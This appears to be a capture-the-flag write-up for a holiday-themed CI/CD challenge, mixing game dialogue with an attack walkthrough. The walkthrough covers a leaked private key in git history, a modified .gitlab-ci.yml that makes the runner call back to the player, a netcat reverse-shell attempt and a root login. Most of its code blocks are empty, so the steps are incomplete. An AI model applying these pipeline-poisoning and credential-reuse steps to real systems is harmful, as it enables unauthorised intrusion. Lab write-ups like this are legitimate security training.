Exploit a CI/CD pipeline. Get hints for this challenge from Tinsel Upatree in the Elfen Ring.

Difficulty: 5/5

## Chat with Rippin Proudboot
Have you managed to help Tinsel with his prison escape?

...

Yes, hello, I'm Rippin Proudboot. Can I help you?

Oh, you'd like to help me? Well, I'm not quite sure you can, but we shall see.

The elves here introduced me to this new CI/CD technology. It seems quite efficient.

Unfortunately, the sporcs seem to have gotten their grubby mits on it as well, along with the Elfen Ring.

They've used CI/CD to launch a website, and the Elfen Ring to power it.

Might you be able to check for any misconfigurations or vulnerabilities in their CI/CD pipeline?

If you do find anything, use it to exploit the website, and get the ring back!

Greetings Noble Player, 

Many thanks for answering our desperate cry for help!

You may have heard that some evil Sporcs have opened up a web-store selling 
counterfeit banners and flags of the many noble houses found in the land of 
the North! They have leveraged some dastardly technology to power their 
storefront, and this technology is known as PHP! 

***gasp*** 

This strorefront utilizes a truly despicable amount of resources to keep the 
website up. And there is only a certain type of Christmas Magic capable of 
powering such a thing… an Elfen Ring!

Along with PHP there is something new we've not yet seen in our land. 
A technology called Continuous Integration and Continuous Deployment! 

Be wary! 

Many fair elves have suffered greatly but in doing so, they've managed to 
secure you a persistent connection on an internal network. 

BTW take excellent notes! 

Should you lose your connection or be discovered and evicted the 
elves can work to re-establish persistence. In fact, the sound off fans
and the sag in lighting tells me all the systems are booting up again right now.  

Please, for the sake of our Holiday help us recover the Ring and save Christmas!

Referring back to the conversation with Tinsel Upatree:

Let's verify that the gitlab endpoint is up:
```

Now, let's clone the repo.
```

Looking through the commit history we find a private key.

Let's copy the private key in the location `.ssh/id_rsa`

Next, let's clone the repo using ssh. This should give us advanced privileges.

```

Let's inspect the .gitlab-ci.yml file as this controls the CI CD pipeline. The runner has access to the private key for the root user at wordpress.flag.net.internal which it uses to copy website files.
```
grinchum-land:~$ ls
wordpress.flag.net.internal
grinchum-land:~$ cd wordpress.flag.net.internal/

```
I spun up an HTTP server using `python3 -m http.server` and modified the file like so, to get the gitlab runner to execute an HTTP server to my server, but that didn't work.
```

I also tried wrapping the command in quotes based on this doc: https://docs.gitlab.com/ee/ci/yaml/script.html#use-special-characters-with-script. Still didn't work. I concluded that curl is not supported on the gitlab runner.

Next, I tried a netcat based approach. I set up a netcat listener on port 4444 and committed the following change:
```

Soon...

Now, let's use the private key to login to wordpress.flag.net.internal as root.

```

## Rejoice
How unexpected, you were actually able to help!

Well, then I must apoligize for my dubious greeting.

Us Flobbits can't help it sometimes, it's just in our nature.

Right then, there are other Flobbits that need assistance further into the burrows.

Thank you, and off you go.

# Chat with Grinchum
😖 A second Precious is gone! Now we only have three.

🤨 Why are you humanses nagging us? We are busy. grinchum..grinchum

You want to know about us? If we tell the naggy human, will it go away? Fine...

🥺 The jolly human and the elfses locked up the Preciouses, but I freed them all, and together we escaped.

We fled, and we were so alone. We soon forgot the taste of Lembanh, the softness of snowflakes falling, even our name.

And we only wanted to eat raw fish: nigiri, maki, or shashimi. But we most likes gnawing the whole, living fish, so juicy sweet.

Then we saw the Sporcses, and they wanted my Preciouses all to themselves.

And the humanses came, but they just want coinses for their silly hats.

We only meant to protect you, Preciouses, from the naughty Elfses and Flobbitses and Sporcses, so we locked you away.

😏 Now leave us alone, naggy human, we must find the two missing Preciouses.

Onto the Web Ring!
